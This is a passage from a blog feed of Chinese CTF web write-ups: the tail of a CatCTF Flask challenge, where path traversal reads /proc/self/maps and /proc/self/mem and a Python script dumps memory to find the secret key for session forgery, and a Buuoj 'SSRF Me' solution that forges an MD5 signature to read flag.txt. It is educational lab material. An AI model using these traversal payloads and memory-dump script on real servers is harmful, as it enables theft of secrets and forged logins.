&amp;#34;./details/&amp;#34; + request.args.get(\&amp;#39;file\&amp;#39;, &amp;#34;&amp;#34;)\n    start = request.args.get(\&amp;#39;start\&amp;#39;, &amp;#34;0&amp;#34;)\n    end = request.args.get(\&amp;#39;end\&amp;#39;, &amp;#34;0&amp;#34;)\n    name = request.args.get(\&amp;#39;file\&amp;#39;, &amp;#34;&amp;#34;)[:request.args.get(\&amp;#39;file\&amp;#39;, &amp;#34;&amp;#34;).index(\&amp;#39;.\&amp;#39;)]\n    \n    return render_template(&amp;#34;detail.html&amp;#34;, catname=name, info=cat(filename, start, end))\n    \n\n\n@app.route(\&amp;#39;/admin\&amp;#39;, methods=[&amp;#34;GET&amp;#34;])\ndef admin_can_list_root():\n    if session.get(\&amp;#39;admin\&amp;#39;) == 1:\n        return flag\n    else:\n        session[\&amp;#39;admin\&amp;#39;] = 0\n        return &amp;#34;NoNoNo&amp;#34;\n\n\n\nif __name__ == \&amp;#39;__main__\&amp;#39;:\n    app.run(host=\&amp;#39;0.0.0.0\&amp;#39;, debug=False, port=5637)&amp;#39;</span></span><br></pre></td></tr></table></figure><p>可以看到是flask（</p><p>在/admin路由内，如果session的admin=1的话就会回显flag</p><p>而通过burp抓包访问/admin会回显set cookie: session…</p><p>所以应该是需要我们伪造一个session并且将设置的session修改掉</p><p>伪造session需要知道SECRET_KEY</p><p>这个思路在文章中有提及：</p><p>通过<code>/proc/self/maps</code>读取堆栈分布，然后通过<code>/proc/self/mem</code>读取内存分布，获取secretkey</p><p><a href="http://xn--thaidump-hu2mu8ft21bimnyi7eo8d9s4jesg.py">这里使用thai大师傅的dump.py</a></p><p>先通过<code>?file=../../../../../../../../proc/self/maps</code>获取堆栈分布，将其内容复制并保存至source.txt</p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/6.png" class title="fwf"><p>然后使用dump.py获取secretkey：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re, time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://223.112.5.156:59441/&quot;</span></span><br><span class="line"><span class="comment"># maps_url = f&quot;&#123;url&#125;/info?file=/proc/self/maps&quot;</span></span><br><span class="line"></span><br><span class="line">maps_reg = <span class="string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;).*00000000 00:00 0&quot;</span></span><br><span class="line"><span class="comment"># maps = re.findall(maps_reg, requests.get(maps_url).text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;source.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    maps = re.findall(maps_reg, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(maps)</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> maps:</span><br><span class="line">    start, end = m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    Offset, Length = <span class="built_in">str</span>(<span class="built_in">int</span>(start, <span class="number">16</span>)), <span class="built_in">str</span>(<span class="built_in">int</span>(end, <span class="number">16</span>))</span><br><span class="line">    <span class="comment">#print(Offset,Length)</span></span><br><span class="line">    read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=../../../../../../../proc/self/mem&amp;start=<span class="subst">&#123;Offset&#125;</span>&amp;end=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">    s = requests.get(read_url).content</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    rt = re.findall(<span class="string">b&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, s)</span><br><span class="line">    <span class="keyword">if</span> rt:</span><br><span class="line">        <span class="built_in">print</span>(rt)</span><br></pre></td></tr></table></figure><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/7.png" class title="gwg"><p>获取到secretkey后使用flask-session-cookie-manager即可</p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/8.png" class title="hwh"><p>最后修改cookie即可</p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/9.png" class title="iwi">]]></content>
    
    
    <summary type="html">&lt;p&gt;又是被虐爆的一天，太难了&lt;/p&gt;</summary>
    
    
    
    <category term="CTF WriteUp" scheme="http://example.com/categories/CTF-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj SSRF Me 题解</title>
    <link href="http://example.com/2022/12/28/Buuoj-SSRF-Me-%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/12/28/Buuoj-SSRF-Me-%E9%A2%98%E8%A7%A3/</id>
    <published>2022-12-28T03:40:42.000Z</published>
    <updated>2023-03-12T09:43:56.836Z</updated>
    
    <content type="html"><![CDATA[<p>昨天做到的一个很好的题目（个人觉得），写出来给大家看看（</p><span id="more"></span><h2><span id="打开靶机"> 打开靶机</span></h2><p>打开靶机，直接看到源码，并且能够看到提示，flag在flag.txt内：</p><img src="/2022/12/28/Buuoj-SSRF-Me-%E9%A2%98%E8%A7%A3/1.png" class title="awa"><p>但是这源码也太恶心人了吧，这谁看得懂啊…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(&#x27;latin1&#x27;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#x27;/&#x27;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span></span><br></pre></td></tr></table></figure><p>然后经过我不懈的努力（雾</p><p>把源码整理好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#非常优质的题目属于是，考对代码的审计能力（认真读）</span></span><br><span class="line"><span class="comment">#源码如下：</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="审代码"> 审代码</span></h2><p>接下来慢慢对代码进行审计即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flask类题目，给源码，结合题目SSRF，需要我们进行代码的审计，首先读路由：</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#genesign路由，通过get传入param参数，action = sign，然后返回函数getSign的结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#De1ta路由，cookie传入action sign、get传入param，如果通过waf，执行exec</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="comment">#显示源码</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#然后是函数：</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#getSign函数，返回字符串secret_key与param与action拼接的md5结果</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="comment">#md5加密</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#waf：过滤gopher和file</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):<span class="comment">#如果checkSign通过</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)<span class="comment">#有scan在action内时，执行scan方法，将param的结果储存到result.txt内</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:<span class="comment">#有read在action内时，执行read方法，读取result.txt的结果</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):<span class="comment">#检查如果getSign()后的结果=sign时，回显true</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h2><span id="获取flag"> 获取flag</span></h2><p>整理一下大概就是如下的思路：</p><p>通过exec函数读取flag.txt的内容，而flag.txt的内容会被scan的action存储在result.txt中</p><p>我们只需要获得read方法读取即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag的内容可以通过scan函数储存，read函数读取--&gt;</span><br><span class="line">action中需要有readscan--&gt;</span><br><span class="line">又需要checkSign通过--&gt;</span><br><span class="line">getSign(self.action, self.param) == self.sign --&gt;</span><br><span class="line">而getsign又返回hashlib.md5(secert_key + param + action).hexdigest()--&gt;</span><br><span class="line">等价于hashlib.md5(secert_key + param + action).hexdigest()==self.sign</span><br></pre></td></tr></table></figure><p>sign，action在/De1ta路由中由cookie传入，而param由get方法传入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">action=readscan,sign=一个md5值</span><br><span class="line">--&gt;/geneSign会返回secret_key+param+scan的md5</span><br><span class="line">--&gt;param=flag.txtread，成功获取sign</span><br><span class="line">--&gt;/De1ta中param=flag.txt,action=readscan,符合checkSign，又有read和scan，就会输出flag</span><br></pre></td></tr></table></figure><p>所以我们需要先访问/geneSign路由，然后param=flag.txtread</p><p>返回一个值：(055967a25e4ba3f082a3ab94e0344994)</p><p>注：这个值随每次靶机打开都是不一样的</p><p>这个值就是flag.txtreadscan的sign值：</p><p>而我们传入的参数param，action又是flag.txt、readscan，完美符合sign值</p><p>然后使用bp抓包，添加cookie，修改url即可：</p><img src="/2022/12/28/Buuoj-SSRF-Me-%E9%A2%98%E8%A7%A3/2.png" class title="bwb"><p>结束~</p><h2><span id="另解哈希长度拓展攻击"> 另解：哈希长度拓展攻击</span></h2><p>虽然但是我并不知道这个怎么用，在这里贴出大佬的wp吧（</p><ul><li><a href="https://xz.aliyun.com/t/5927#toc-1">De1CTF ssrf_me 的三种解法 - 先知社区 (aliyun.com)</a></li></ul><hr><p>略略水一篇博客没人骂我的吧~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;昨天做到的一个很好的题目（个人觉得），写出来给大家看看（&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj题目(3)</title>
    <link href="http://example.com/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/"/>
    <id>http://example.com/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/</id>
    <published>2022-12-24T03:28:18.000Z</published>
    <updated>2023-03-12T09:43:56.844Z</updated>
    
